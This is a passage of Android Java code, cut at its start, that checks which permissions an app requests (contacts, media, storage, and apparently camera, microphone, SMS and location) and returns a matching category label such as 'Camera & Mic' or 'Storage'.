            if (p.equals(Manifest.permission.READ_CONTACTS))       hasCon  = true;
            if (p.equals(Manifest.permission.READ_MEDIA_IMAGES)
             || p.equals(Manifest.permission.READ_EXTERNAL_STORAGE)) hasMedia = true;
        }
        if (hasCam && hasMic) return "Camera & Mic";
        if (hasCam)   return "Camera";
        if (hasMic)   return "Microphone";
        if (hasSms)   return "Messaging";
        if (hasLoc)   return "Location";
        if (hasCon)   return "Contacts";
        if (hasMedia) return "Storage";
        return "Permissions";
    }

}
